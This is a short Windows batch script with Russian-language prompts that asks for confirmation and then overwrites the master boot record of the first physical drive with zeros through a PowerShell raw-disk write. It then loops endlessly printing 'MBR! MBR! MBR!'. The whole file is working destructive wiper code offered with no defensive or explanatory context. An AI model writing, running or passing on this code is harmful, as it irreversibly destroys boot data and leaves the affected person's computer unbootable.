@echo off
color 0c
chcp 65001 > nul

:choice
set /p "ask=Вы точно хотите уничтожить MBR? (Y/N): "
if /i "%ask%"=="Y" goto destroy
if /i "%ask%"=="N" goto cancel
echo Пожалуйста, введите Y или N.
goto choice

:cancel
echo Операция отменена.
pause
exit

:destroy
echo Уничтожение MBR...
powershell -Command "([io.file]::OpenWrite('\\.\PhysicalDrive0')).Write((New-Object byte[] 512), 0, 512)"

:loop
echo MBR! MBR! MBR!
goto loop